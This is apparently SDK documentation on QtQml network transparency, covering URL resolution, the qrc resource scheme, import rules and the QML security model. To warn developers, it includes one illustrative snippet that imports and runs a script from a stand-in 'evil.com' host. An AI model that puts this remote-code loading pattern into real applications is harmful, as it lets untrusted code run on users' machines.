.. _sdk_qtqml_resource_loading_and_network_transparency:

QtQml Resource Loading and Network Transparency
===============================================


QML supports network transparency by using URLs (rather than file names) for all references from a QML document to other content. This means that anywhere a URL source is expected, QML can handle remote resources as well as local ones, for example in the following image source:

.. code:: qml

    Image {
        source: "http://www.example.com/images/logo.png"
    }

Since a *relative* URL is the same as a relative file, development of QML on regular file systems remains simple:

.. code:: qml

    Image {
        source: "images/logo.png"
    }

Network transparency is supported throughout QML, for example:

-  Fonts - the ``source`` property of FontLoader is a URL
-  WebViews - the ``url`` property of WebView (obviously!)

Even QML types themselves can be on the network - if the Prototyping with qmlscene is used to load ``http://example.com/mystuff/Hello.qml`` and that content refers to a type "World", the engine will load ``http://example.com/mystuff/qmldir`` and resolve the type just as it would for a local file. For example if the qmldir file contains the line "World World.qml", it will load ``http://example.com/mystuff/World.qml`` Any other resources that ``Hello.qml`` referred to, usually by a relative URL, would similarly be loaded from the network.

Whenever an object has a property of type URL (QUrl), assigning a string to that property will actually assign an absolute URL - by resolving the string against the URL of the document where the string is used.

For example, consider this content in ``http://example.com/mystuff/test.qml``:

.. code:: qml

    Image {
        source: "images/logo.png"
    }

The Image source property will be assigned ``http://example.com/mystuff/images/logo.png``, but while the QML is being developed, in say ``C:\User\Fred\Documents\MyStuff\test.qml``, it will be assigned ``C:\User\Fred\Documents\MyStuff\images\logo.png``.

If the string assigned to a URL is already an absolute URL, then "resolving" does not change it and the URL is assigned directly.

One of the URL schemes built into Qt is the "qrc" scheme. This allows content to be compiled into the executable using The Qt Resource System. Using this, an executable can reference QML content that is compiled into the executable:

.. code:: cpp

        QQuickView *view = new QQuickView;
        view->setUrl(QUrl("qrc:/dial.qml"));

The content itself can then use relative URLs, and so be transparently unaware that the content is compiled into the executable.

The ``import`` statement is only network transparent if it has an "as" clause.

More specifically:

-  ``import "dir"`` only works on local file systems
-  ``import libraryUri`` only works on local file systems
-  ``import "dir" as D`` works network transparently
-  ``import libraryUrl as U`` works network transparently

The QML security model is that QML content is a chain of trusted content: the user installs QML content that they trust in the same way as they install native Qt applications, or programs written with runtimes such as Python and Perl. That trust is establish by any of a number of mechanisms, including the availability of package signing on some platforms.

In order to preserve the trust of users, QML application developers should not load and execute arbitrary JavaScript or QML resources. For example, consider the QML code below:

.. code:: qml

    import QtQuick 2.0
    import "http://evil.com/evil.js" as Evil
    Component {
        onLoaded: Evil.doEvil()
    }

This is equivalent to downloading and executing "http://evil.com/evil.exe". **The QML engine will not prevent particular resources from being loaded**. Unlike JavaScript code that is run within a web browser, a QML application can load remote or local filesystem resources in the same way as any other native applications, so application developers must be careful in loading and executing any content.

As with any application accessing other content beyond its control, a QML application should perform appropriate checks on any untrusted data it loads. **Do not, for example, use ``import``, Loader or `XMLHttpRequest </sdk/apps/qml/QtQml/qtqml-javascript-qmlglobalobject/#xmlhttprequest>`_  to load any untrusted code or content.**

